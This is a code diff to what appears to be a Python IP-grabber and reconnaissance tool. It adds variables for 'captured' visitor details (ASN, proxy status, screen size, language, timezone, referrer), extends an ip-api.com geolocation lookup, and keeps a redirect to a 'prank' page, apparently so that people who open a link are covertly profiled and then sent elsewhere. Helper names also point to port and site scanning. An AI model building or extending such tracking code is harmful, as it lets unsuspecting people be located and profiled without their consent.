@@ -109,7 +109,12 @@ captured_time = None
 captured_country = None
 captured_city = None
 captured_isp = None
-public_url = None
+captured_as = None
+captured_proxy = None
+captured_screen = None
+captured_lang = None
+captured_tz = None
+captured_ref = None
 redirect_url = "https://traiantadgs-ops.github.io/prank/"
 site_scan_result = {}
 subdomain_result = {}
@@ -219,14 +224,19 @@ def check_service_version(host, port):
 
 def get_geo(ip):
     try:
-        url = f"http://ip-api.com/json/{ip}?fields=country,city,isp,query"
+        url = f"http://ip-api.com/json/{ip}?fields=country,city,isp,as,proxy,query"
         with urllib.request.urlopen(url, timeout=3) as r:
             data = json.loads(r.read().decode())
-            return (data.get("country", "?"), data.get("city", "?"), data.get("isp", "?"))
+            return (
+                data.get("country", "?"),
+                data.get("city", "?"),
+                data.get("isp", "?"),
+                data.get("as", "?"),
+                "Yes" if data.get("proxy") else "No"
+            )
     except Exception:
-        return ("?", "?", "?")
-
-
+        return ("?", "?", "?", "?", "?")
+        
 def scan_site(url):
     result = {"URL": url if url.startswith("http") else "http://" + url}
     url = result["URL"]
